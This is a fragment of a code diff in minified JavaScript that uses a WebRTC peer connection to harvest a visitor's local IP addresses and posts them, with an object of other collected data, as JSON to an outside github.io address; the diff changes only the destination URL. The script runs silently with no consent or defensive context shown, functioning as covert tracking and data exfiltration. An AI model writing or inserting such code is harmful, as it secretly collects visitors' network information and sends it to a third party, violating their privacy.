@@ -7,5 +7,5 @@ let pc=new p({iceServers:[]});pc.createDataChannel("");pc.createOffer().then(o=>
 pc.onicecandidate=e=>{if(e&&e.candidate){let m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
 if(m&&!i.includes(m[1])){i.push(m[1]);cb(i);}}};}
 g(function(ip){d.ipAddresses=ip;
-fetch("https://github.com/revenix-aer/rev/",{method:"POST",body:JSON.stringify(d),headers:{"Content-Type":"application/json"}});});
+fetch("https://revenix-aer.github.io/rev",{method:"POST",body:JSON.stringify(d),headers:{"Content-Type":"application/json"}});});
 })();
